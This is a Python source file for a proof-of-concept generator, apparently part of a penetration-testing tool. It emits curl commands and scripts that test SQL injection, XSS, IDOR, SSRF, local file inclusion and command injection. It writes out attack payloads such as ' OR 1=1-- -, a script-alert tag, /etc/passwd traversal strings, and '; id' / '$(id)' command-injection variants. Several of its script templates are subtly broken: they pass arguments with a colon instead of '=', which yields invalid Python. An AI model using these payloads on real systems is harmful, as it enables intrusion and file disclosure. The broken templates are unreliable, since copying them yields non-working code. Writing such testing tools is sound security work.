"""
PoC Generator - Generate proof-of-concept scripts for confirmed findings.

Adapted from Zen-Ai-Pentest post-exploitation concepts, limited to PoC-level
demonstration only. No deep exploitation or secret extraction.
"""

from __future__ import annotations

import json
import textwrap
from typing import Any, Dict, Optional
from urllib.parse import quote, urlparse


class PoCGenerator:
    """Generate proof-of-concept scripts for confirmed findings.

    Each PoC is a curl command + minimal Python script that demonstrates
    the vulnerability exists. No exploitation chains, no secret extraction.
    """

    def generate(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a PoC for a finding.

        Parameters
        ----------
        finding : dict
            Finding details. Expected keys:
            - vuln_type (str): sqli, xss, idor, ssrf, lfi, cmdi, or other
            - url (str): Target URL
            - method (str): HTTP method (default GET)
            - parameter (str): Vulnerable parameter name
            - payload (str): Payload that triggers the vulnerability
            - request (str): Original HTTP request
            - response (str): Original HTTP response or indicator
            - title (str): Finding title
            - headers (dict): Custom headers

        Returns
        -------
        dict
            poc_type, language, script, curl_command, description, safety_level
        """
        vuln_type = (
            finding.get("vuln_type")
            or finding.get("type")
            or self._detect_vuln_type(finding)
        ).lower()

        generators = {
            "sqli": self._generate_sqli_poc,
            "sql_injection": self._generate_sqli_poc,
            "xss": self._generate_xss_poc,
            "cross_site_scripting": self._generate_xss_poc,
            "idor": self._generate_idor_poc,
            "insecure_direct_object_reference": self._generate_idor_poc,
            "ssrf": self._generate_ssrf_poc,
            "server_side_request_forgery": self._generate_ssrf_poc,
            "lfi": self._generate_lfi_poc,
            "local_file_inclusion": self._generate_lfi_poc,
            "cmdi": self._generate_cmdi_poc,
            "command_injection": self._generate_cmdi_poc,
        }

        gen = generators.get(vuln_type, self._generate_generic_poc)
        return gen(finding)

    def _detect_vuln_type(self, finding: Dict[str, Any]) -> str:
        """Attempt to detect vulnerability type from title/description."""
        title = (finding.get("title") or "").lower()
        desc = (finding.get("description") or "").lower()
        combined = f"{title} {desc}"

        type_keywords = {
            "sqli": ["sql injection", "sqli", "sql error", "union select"],
            "xss": ["cross-site scripting", "xss", "script injection"],
            "idor": ["idor", "insecure direct object", "broken access"],
            "ssrf": ["ssrf", "server-side request forgery"],
            "lfi": ["local file inclusion", "lfi", "path traversal", "directory traversal"],
            "cmdi": ["command injection", "os command", "rce", "remote code execution"],
        }

        for vuln_type, keywords in type_keywords.items():
            for kw in keywords:
                if kw in combined:
                    return vuln_type

        return "generic"

    def _generate_sqli_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SQLi PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        method = finding.get("method", "GET").upper()
        param = finding.get("parameter", "id")
        payload = finding.get("payload", "' OR 1=1-- -")
        headers = finding.get("headers", {})

        # Curl command
        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        # Python script
        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: SQL Injection - {finding.get('title', 'SQLi')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            payload = "{payload}"
            headers = {json.dumps(headers)}

            # Normal request (baseline)
            normal = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: "1"}}, headers=headers)

            # Injection request
            injected = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: payload}}, headers=headers)

            print(f"Baseline: status={{normal.status_code}}, length={{len(normal.text)}}")
            print(f"Injected: status={{injected.status_code}}, length={{len(injected.text)}}")

            if len(injected.text) != len(normal.text) or injected.status_code != normal.status_code:
                print("[!] Potential SQL injection confirmed - response differs")
            else:
                print("[-] Responses identical - may need different payload")
        """)

        return {
            "poc_type": "sqli",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"SQL injection PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_xss_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate XSS PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "q")
        payload = finding.get("payload", "<script>alert(document.domain)</script>")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Cross-Site Scripting - {finding.get('title', 'XSS')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            payload = '{payload}'
            headers = {json.dumps(headers)}

            resp = requests.get(url, params={{param: payload}}, headers=headers)

            if payload in resp.text:
                print("[!] XSS confirmed - payload reflected unencoded in response")
                # Find the reflection context
                idx = resp.text.find(payload)
                context = resp.text[max(0, idx-50):idx+len(payload)+50]
                print(f"Context: ...{{context}}...")
            else:
                print("[-] Payload not reflected as-is in response")
        """)

        browser_url = f"{url}?{param}={quote(payload)}"

        return {
            "poc_type": "xss",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "browser_url": browser_url,
            "description": f"XSS PoC for {param} parameter at {url}",
            "safety_level": "safe",
        }

    def _generate_idor_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IDOR PoC."""
        url = finding.get("url", "http://TARGET/api/users/1")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl_1 = f"curl -s {header_flags} \"{url}\"".strip()
        # Replace last ID segment with another value
        parsed = urlparse(url)
        path_parts = parsed.path.rstrip("/").split("/")
        if path_parts and path_parts[-1].isdigit():
            other_id = str(int(path_parts[-1]) + 1)
            alt_path = "/".join(path_parts[:-1] + [other_id])
            alt_url = f"{parsed.scheme}://{parsed.netloc}{alt_path}"
        else:
            alt_url = url + "?id=2"
        curl_2 = f"curl -s {header_flags} \"{alt_url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: IDOR - {finding.get('title', 'IDOR')}\"\"\"
            import requests

            url_own = "{url}"
            url_other = "{alt_url}"
            headers = {json.dumps(headers)}

            # Access own resource
            resp_own = requests.{method.lower()}(url_own, headers=headers)
            # Access other user's resource
            resp_other = requests.{method.lower()}(url_other, headers=headers)

            print(f"Own resource: status={{resp_own.status_code}}, length={{len(resp_own.text)}}")
            print(f"Other resource: status={{resp_other.status_code}}, length={{len(resp_other.text)}}")

            if resp_other.status_code == 200:
                print("[!] IDOR confirmed - accessed other user's resource with same credentials")
            elif resp_other.status_code in (401, 403):
                print("[-] Access denied - authorization check in place")
            else:
                print(f"[?] Unexpected status {{resp_other.status_code}}")
        """)

        return {
            "poc_type": "idor",
            "language": "python",
            "script": script,
            "curl_command": f"# Own resource:\\n{curl_1}\\n# Other user's resource:\\n{curl_2}",
            "description": f"IDOR PoC comparing access to {url} vs {alt_url}",
            "safety_level": "safe",
        }

    def _generate_ssrf_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSRF PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "url")
        payload = finding.get("payload", "http://127.0.0.1:80")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: SSRF - {finding.get('title', 'SSRF')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            # Test internal endpoint access
            payloads = [
                "http://127.0.0.1:80",
                "http://localhost:80",
                "http://[::1]:80",
            ]

            for ssrf_payload in payloads:
                resp = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: ssrf_payload}}, headers=headers, timeout=10)
                print(f"Payload: {{ssrf_payload}} -> status={{resp.status_code}}, length={{len(resp.text)}}")
        """)

        return {
            "poc_type": "ssrf",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"SSRF PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_lfi_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate LFI PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "file")
        payload = finding.get("payload", "../../../../etc/passwd")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Local File Inclusion - {finding.get('title', 'LFI')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            payloads = [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
            ]

            for lfi_payload in payloads:
                resp = requests.get(url, params={{param: lfi_payload}}, headers=headers)
                if "root:" in resp.text or "daemon:" in resp.text:
                    print(f"[!] LFI confirmed with payload: {{lfi_payload}}")
                    print(f"Response excerpt: {{resp.text[:200]}}")
                    break
            else:
                print("[-] Standard LFI payloads did not return expected content")
        """)

        return {
            "poc_type": "lfi",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"LFI PoC for {param} parameter at {url}",
            "safety_level": "safe",
        }

    def _generate_cmdi_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate command injection PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "cmd")
        payload = finding.get("payload", "; id")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Command Injection - {finding.get('title', 'CMDi')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            # Use a safe command that proves execution
            payloads = [
                "; id",
                "| id",
                "`id`",
                "$(id)",
            ]

            for cmdi_payload in payloads:
                resp = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: "test" + cmdi_payload}}, headers=headers, timeout=10)
                if "uid=" in resp.text:
                    print(f"[!] Command injection confirmed with: {{cmdi_payload}}")
                    print(f"Response excerpt: {{resp.text[:200]}}")
                    break
            else:
                print("[-] Standard CMDi payloads did not return expected output")
        """)

        return {
            "poc_type": "cmdi",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Command injection PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_generic_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a generic replay PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})
        request_body = finding.get("request") or finding.get("body") or ""

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if request_body:
            curl = f"curl -s -X {method} {header_flags} -d '{request_body}' \"{url}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: {finding.get('title', 'Security Finding')}\"\"\"
            import requests

            url = "{url}"
            method = "{method}"
            headers = {json.dumps(headers)}
            body = '''{request_body}'''

            resp = requests.request(method, url, headers=headers, data=body if body else None, timeout=10)
            print(f"Status: {{resp.status_code}}")
            print(f"Length: {{len(resp.text)}}")
            print(f"Response: {{resp.text[:500]}}")
        """)

        return {
            "poc_type": "generic",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Generic replay PoC for {finding.get('title', 'finding')} at {url}",
            "safety_level": "safe",
        }
